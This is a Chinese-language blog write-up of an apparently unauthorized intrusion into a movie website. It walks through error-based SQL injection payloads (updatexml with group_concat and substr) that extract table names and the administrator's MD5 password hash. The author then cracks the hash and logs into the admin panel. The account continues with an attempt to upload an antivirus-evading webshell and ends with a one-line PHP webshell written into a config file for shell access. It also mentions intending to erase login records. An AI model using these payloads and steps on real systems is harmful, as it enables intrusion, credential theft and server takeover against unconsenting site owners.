## 一、 **发现漏洞**

### 1.1. 发现

这是一篇两年前的笔记了。之前平常喜欢看些电影影片，不想充值VIP，才发现的网站，但是这个网站A并不是主要测试的，而是通过发现他的兄弟网站B，然后进行渗透。

### 1.2. 测试

有事没事对网站动一动，发现A存在XSS，但是并没有多大的利用价值，但是通过友情链接，跳转到了B，就觉得B可能也在同个位置存在XSS但是，令人惊讶的是，我没发现XSS，但是确发现存在SQLI。加了个’,直接把sql语句爆出来了，如下图1。

![image.png](https://image.3001.net/images/20221019/1666169764_634fbba4518159d4f66c2.png!small)

图 1

## 二、 **漏洞利用**

### 2.1 闭合规则 **  
**

原始的语句：

> SELECT `y80s_movies`.*, `y80s_photos`.`path` AS photo_path,
> `y80s_photos`.`share` AS photo_share
>
> FROM (`y80s_movies`)
>
> LEFT OUTER JOIN `y80s_photos` y80s_photos ON `y80s_photos`.`id` =
> `y80s_movies`.`photo_id`
>
> WHERE `y80s_movies`.`public` = '1'
>
> AND `y80s_movies`.`attribute` NOT LIKE '%%1%%'
>
> AND (name like '%XXX%' or aka like '%XXX%')
>
> ORDER BY `y80s_movies`.`update` DESC, `y80s_movies`.`id` DESC
>
> LIMIT 25

原始报文：``

> ``
>  
>  
>     HTTP/1.1 500 Internal Server Error
>  
>     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type,
> Accept, Authorization, Accept-Encoding, UserAccount
>  
>     Server: nginx
>  
>     Date: Thu, 29 Oct 2020 01:36:40 GMT
>  
>     Content-Type: text/html; charset=utf-8
>  
>     X-Powered-By: PHP/5.6.38
>  
>     X-Cache: MISS from aws-jp08
>  
>     X-Cache: MISS from asia-hk11
>  
>     Connection: close
>  
>     Content-Length: 882
>  
>     Array
>  
>     (
>  
>     [0] => Error Number: 1064
>  
>     [1] => You have an error in your SQL syntax; check the manual that
> corresponds to your MySQL server version for the right syntax to use near
> '%' or aka like '%xxx%')
>  
>     ORDER BY `y80s_movies`.`update` DESC, `y80s_movies`.' at line 6
>  
>     [2] => SELECT `y80s_movies`.*, `y80s_photos`.`path` AS photo_path,
> `y80s_photos`.`share` AS photo_share
>  
>     FROM (`y80s_movies`)
>  
>     LEFT OUTER JOIN `y80s_photos` y80s_photos ON `y80s_photos`.`id` =
> `y80s_movies`.`photo_id`
>  
>     WHERE `y80s_movies`.`public` = '1'
>  
>     AND `y80s_movies`.`attribute` NOT LIKE  '%%1%%'
>  
>     AND (name like '%XXX%' or aka like '%XXX'%')
>  
>     ORDER BY `y80s_movies`.`update` DESC, `y80s_movies`.`id` DESC
>  
>     LIMIT 25
>  
>     [3] => Filename: /home/wwwroot/XXXX/libraries/datamapper.php
>  
>     [4] => Line Number: 1410
>  
>     )
>  
>     <html>
>  
>     <head>
>  
>     <title>Error</title>
>  
>     </head>
>  
>     <body>
>  
>     hi</body>
>  
>     </html>
>
> ``

``

  

XXX为输入的位置，同上可以看出，会同时在两处插入，但其实只需要管一处即可，后面可以注释掉。

当时在考虑，怎么闭合这个规则，怎么执行自己想执行的语句。但是可能被这么长的语句吓到了，不知道从何下手。也可能是因为自己数据库基础不扎实。其实仔细分析，都是可以化繁为简的。这语句也就是select
字段 from 表名 （一个左外连接） where XXX and XXX and XXX order by
XXX。以上是我想的，看看老王想的：这个构造看清大逻辑，select xxx from ta left outer join tb on ta.a=tb.b
where con1=xxxxx and con2=xxxx oder by a.a,b.b limit
25，然后得出：注入是在where那里。你学废了吗？

### 2.2 爆数据

这步应该是最多的，一开始自己找不到闭合规则，经常会报错，而且还是乱码，如下图2：

![image.png](https://image.3001.net/images/20221019/1666169765_634fbba54d59f6f658207.png!small)

图 2

一开始猜测是回显了数据表，所以导致了乱码，但是并不是，应该只是服务器的问题。这服务器本来就不太稳定，换下查询数据，刷新页面，多试几次就好了。然后思路就想着，构造一个判断语句，通过是与否来判断数据库的信息，然后有了以下的两个payload：

> `1、%e4%ba%ba') and 1=1 or (‘1’=’1`
>
> `2、%e4%ba%ba') and exists(select path from y80s_photos) or ('1'='1`

  

但是这payload真的是太傻了，好在报错信息有提供表名和mysql默认表dual，不然都没法判断是否构造完成。接下来是内容由老王指导完成。

通过union或者updatexml进行查询，内容有回显，一开始我并不知道的，后面通过百度查询到了updatexml用法，于是自己构造了个：

> `1、%e7%88%b1') and updatexml(1,concat('~',(select database()),'~'),3)--+﻿`

获取了数据名80s，如下图3：

![image.png](https://image.3001.net/images/20221019/1666169766_634fbba62858da882d2f0.png!small)

图 3

既然可以回显，那紧接着，就是查询所有的表名。

笔记：

查询数据库中所有表名

> `select table_name from information_schema.tables where table_schema='数据库名'
> and table_type='base table';﻿`
>
> `select table_name from information_schema.tables where table_schema='数据库名'`

查询指定数据库中指定表的所有字段名column_name

> `select column_name from information_schema.columns where
> table_schema='数据库名' and table_name='表名'`

于是构造了

> `payload：%e7%88%b1') and updatexml(1,concat('~',(select table_name from
> information_schema.tables where table_schema='80s' limit 0,1),'~'),3)--+﻿`

其实limit是后面加的，服务器返回：Subquery returns more than 1
row，但是这边只能显示一条，所以一开始思路是使用limit一条一条去查出来，如下图4、图5：

![image.png](https://image.3001.net/images/20221019/1666169767_634fbba72362a2ec58c4a.png!small)

图 4

![image.png](https://image.3001.net/images/20221019/1666169768_634fbba81bcfe9be7a817.png!small)

图 5

利用burp-Intruder爆破出数据库，但是，这样太慢了。

老王提供了个函数group_concat()，group_concat()类似一个聚集函数，把所有内容拼接成字符串，默认用逗号隔开。于是我的payload就变成：

> `%e6%98%9f') and updatexml(1,concat('~',(select group_concat(table_name)
> from information_schema.tables where table_schema='80s'),'~'),3)--+﻿`

但是，人算不如天算，他回显内容有限制长度的，如下图6：

![image.png](https://image.3001.net/images/20221019/1666169768_634fbba8f19b7cc4c51b0.png!small)

图 6

看Y80应该可以明显感觉断了，及时看不出来，也不应该就这几个表吧！这时候想到，我们岂不是可以通过limit限制内容，把已经看到了的不输出，我真是天才，然后我构造了payload：

> `%e6%98%9f') and updatexml(1,concat('~',(select group_concat(table_name)
> from information_schema.tables where table_schema='80s' limit
> 6,2),'~'),3)--+﻿`

发现页面居然正常跳转了，没有报错，我人傻了，估计是sql语句又哪里有问题了吧！后面看了老王的，他构造的是：

> `123333') and updatexml(1,concat(0x7e,(select group_concat(x.movie_id) from
> (select movie_id from hits limit 3,3)x),0x7e),1)--+﻿`

select group_concat(x.movie_id) from x，从x表查询movieid，然后聚集成一行，x表是个别名，x = seelect
movie_id from hits limit
3,3，从hits查movieid，从记录3往后查3条，结果是个一列三行的数据临时表，然后前面配合聚集，把这三行连接，这样就不用limit
a,1这种，每次限制一行记录，这个可以limit a,5这样，一次查五条。搜嘎！

由于我只是想登入后台，尝试找出管理员的表即可，我就还是一个一个试，最终找到管理员表y80s_managers，然后根据payload：

> `%e6%98%9f') and updatexml(1,concat('~',(select group_concat(column_name)
> from information_schema.columns where table_schema='80s' and
> table_name='y80s_managers'),'~'),3)--+﻿`

查询出字段名id,name,password,right_id,lock等，如下图7：

![image.png](https://image.3001.net/images/20221019/1666169769_634fbba9f0f34f38bb965.png!small)

图 7

但是我们主要还是账号名密码，所以继续！构造payload：

> `%e5%a6%bb') and updatexml(1,concat('~',(select group_concat(name) from
> y80s_managers),'~'),3)--+﻿`

如下图8：

![image.png](https://image.3001.net/images/20221019/1666169771_634fbbab1260ed5610246.png!small)

图 8

可以看到，只有一个账户，name为me****zz，再查询密码，如下图9：

![image.png](https://image.3001.net/images/20221019/1666169772_634fbbac5147901187702.png!small)

图 9

忘记这个是有限制字段的，也没注意看是否是以~结尾，然后拿去md5解密，发现解不开，数了一下，31位的md5？这时候才发现，后面还有。于是使用substr函数，去截取后面的字段，回显！

> `Payload：%e6%96%b0') and updatexml(1,concat('~',(select substr(password,31)
> from y80s_managers),'~'),3)--+﻿`

Substr(str,pos,len),pos开始的位置，len为长度，str字符串，len没输入的时候默认是pos开始截取到最后的位置。于是有了以下图10：

![image.png](https://image.3001.net/images/20221019/1666169773_634fbbad95bcdbc42cc2c.png!small)

图 10

果然掉了一位，最后得到md5：9356*************63c

## 三、 **解密账号密码**

### 3.1成功登录 **  
**

Md5解开后得到账号名密码：

Me****zz，935********63c(pj*****@)

然后使用dirsearch，搜索出后台（其实我是先找到后台才想着去注入的），成功登录，如下图11：

![image.png](https://image.3001.net/images/20221019/1666169774_634fbbaeab6f3c79bba66.png!small)

图 11

原本想删除登录记录的，但是发现这后台功能有点简陋，好像没有发现有登录记录之类的，就没先下了，后续再二次进攻！

### 3.2 收获其他信息

以下是收集到的其他信息：

> `database：80s`
>
> `mysql5.6.44`
>
>
> `table:hits,y80s_ads,y80s_articles,y80s_bigphotos,y80s_caijis,y80s_cast_infos,y80s_casts,y80s_casts_movies,y80s_directors_movies,y80s_directors,`
>
>
> `y80s_dlurls,y80s_dlurls_movies,y80s_doubans,y80s_duoshuo_comments，y80s_forhotmovies，y80s_hits，y80s_hotwords，y80s_infos，y80s_managers，y80s_moviedesc_ups`
>
> `y80s_ads:`
>
> `id title name content`
>
> `y80s_managers：`
>
> `id,name,password,right_id,lock`
>
>  
>

## 四、 **寻找上传点**

发现该网站存在设置影片的图片，直接上免杀马。免杀马是github上大佬写的生成工具，已测试过是可以过360和D盾的。链接：<https://github.com/pureqh/Troy>

![image.png](https://image.3001.net/images/20221019/1666169775_634fbbafbe61e2ddfbf59.png!small)

![image.png](https://image.3001.net/images/20221019/1666169776_634fbbb09e6a63dcf0ebf.png!small)

服务器直接报错。多番尝试发现无法上传马。还发现了数据库备份，但是貌似无法修改数据库扩展名。

## 五、 **柳暗花明又一村**

在查看网站功能的时候，我又发现了另一个好东西：

![image.png](https://image.3001.net/images/20221019/1666169778_634fbbb23740b8616761c.png!small)

配置文件编辑。直接把一句话木马写到配置文件里面。通过写入<?php
phpinfo();?>后，发现在每个页面初始化的时候，都会去调用该配置文件。直接getshell。

# 六、 **小结**

闭合规则是花费时间最长的，还有后面要利用的时候，构造payload也是我花费时间最多的，基本都是百度上查，很多都不懂，两个的根本原因还是因为对sql注入，乃至数据库的基础都不是很懂，很多函数，都不知道，不知道有功能有什么函数，在利用的时候就难以下手，耗费大量时间。其次还可通过mysql直接写入shell的，这个也是后面才知道的，不过写入shell的前提条件较为苛刻。

